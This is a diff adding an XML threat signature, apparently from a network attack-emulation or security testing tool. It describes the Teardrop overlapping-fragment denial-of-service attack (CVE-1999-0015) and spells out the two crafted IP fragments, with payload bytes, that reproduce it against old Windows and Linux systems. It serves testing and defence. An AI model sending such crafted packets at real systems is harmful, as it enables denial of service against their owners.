@@ -1,0 +1,80 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Teardrop Fragment Assembly Attack"/>
+    <EngDesc display="true" value="The threat sends out a single ICMP ping packet comprised of two fragments. The second fragment overlaps the first fragment and does not exceed the first fragment's length, causing an improper bounds checking error (copying too much memory). Affects older Linux kernels and versions of Windows."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="IP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Protocol"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+      <item value="OpenBSD"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_95"/>
+      <item value="Microsoft_Windows_NT_4.0_Service_Pack_1"/>
+      <item value="Microsoft_Windows_NT_4.0_Service_Pack_2"/>
+      <item value="Microsoft_Windows_NT_4.0_Service_Pack_3"/>
+      <item value="OpenLinux_Standard_1.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/bid/124"/>
+    <CVEID display="true" value="CVE-1999-0015"/>
+    <bugtraqID display="true" value="124"/>
+    <OSVDB display="true" value="5727"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff4650f38500a900fe009b00c965fef43f"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742243399218750"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value="IP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\Xaa"/>
+    <Created value="1139462503" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+    <for index="D"/>
+    <for index="E"/>
+    <for index="F"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="2" FragmentOffset="0" TTL="14" Protocol="1" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" Payload="08006486860e000b38d2b440324a030008090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f3031323334353637" CE="false" DF="false" MF="true"/>
+    </Ethernet>
+  </Output>
+  <Output index="B" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="2" FragmentOffset="2" TTL="14" Protocol="1" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" Payload="aa" CE="false" DF="false" MF="false"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
